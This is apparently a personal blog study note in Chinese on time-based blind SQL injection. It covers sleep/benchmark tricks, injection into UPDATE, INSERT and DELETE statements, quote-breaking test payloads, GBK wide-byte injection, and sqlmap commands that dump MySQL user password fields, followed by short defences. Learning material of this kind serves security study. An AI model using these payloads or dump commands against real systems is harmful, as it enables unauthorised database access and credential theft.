---
title: sql_注入进阶
date: 2019-01-04 13:44:43
tags: sql_inject
---

> 基于时间延时的盲注

> 一. 基于时间延时的盲注

​		`select sleep(5)；等待五秒，返回值是0***`

​		`select if(arg1,arg2,arg3);判断返回值的真假`

​		`select benchmark(50000,md5('abc')) `前面是执行次数，后面是执行的命令

* 判断第一个字母的方法

  

  ​	`ASCII(substr(version(),1,1)>50)`

* 判断ASCII码对应的值：	

  ​	`select chr(49);`

* 例子：

  ​	`1.select if(length(versioin())>5,sleep(3),1);先判段长度`

  ​	`2.select if(ascii substr((version()),1,1))>50,sleep(2),0);再判断每个字母是什么`



（先测试普通的注入，都不行就开始测试时间延迟盲注）

> 二. 应用：---->除了select语句以外，其他的sql语句都有危险性，千万小心！！！	



* select（搜索功能）的注入：

​		`select * from books where name like 'zs';`



* update语句注入：

  * 原句：`UPDATE Person SET FirstName = 'Fred' WHERE LastName = 'Wilson' `
  * 构造的语句：`update users set pass = '123' where if(length(version())>5,sleep(2),0)#`
  * 注意：使用update时一定返回值为0，否则密码全被改掉了！！！

* insert(插入语句)测注入：

  * 原句：`insert into users(id,name,password)value(1,'we','123')`

  * 构造的：`1',1,1)#`

    

    

* delete语句：

  * 原句：`delete from user where id =5`

    如果数据够多，可以采用布尔盲注（省时间但是会删除成功）

    如果保留数据，就采用延时盲注（可能会比较浪费时间但不会真删除）

    



> 三. 正确安全的测试注入步骤（不改数据库）：

​	先-->：
			

```	
		123' and sleep(1) #
		123" and sleep(1) #
		123') and sleep(1) #
		123") and sleep(1) #
```

​	然后-->：

```	
	123' and id = 100 and sleep(3)#
	123' and id = 1 and sleep(3)#
	123' and id = 10 and sleep(3)#
	123' and id = 11 and sleep(3)#
	123' and id = 111 and sleep(3)#
```

最后-->：

```
	123' and id = 1 and if(length(version())>5,sleep(3),0) #

	update users set img = 'uploads/1546450026timg3.jpg' where name 'qwerdf'
```

* 宽字节注入-GBK编码

  * 原理：

    GBK注入：DF 5c 2字节，利用%df’的方式就可以注入

    utf8 3字节	没有注入

* 二次编码注入

​	使用比较少，这里就不总结了

> 四. 自动扫描sql注入：sqlmap

​	启动：`python sqlmap.py --url 'http://192.168.11.86/index.php?id=1' 添加注入地址`

​	-v参数 1-6可以选择显示的详细程度，报告默认保存在家目录下

​	常规步骤：

```
	--dbs 列出所有的数据库
	-D	库 --tables列出所有的表		
	-T	表	--columns列出所有的字段		
	-C	字段 --dump获取字段内容	
	--dump列出详细信息
```

## 	

举例：`C:\tools\sqlmap-1.2.12>python sqlmap.py --url http://192.168.11.86/index.php?id=1 -D mysql -T user --columns -C password --dump`



* 五.防御sql注入的方法：
  * 1.addslashes(string)；可以把字符中的引号加上\进行转义，但是不能防御数字型注入即id=1 and 类型
  * 2.PDO进行绑定
  * 3.使用防御软件进行（如Web Application Firewall等）

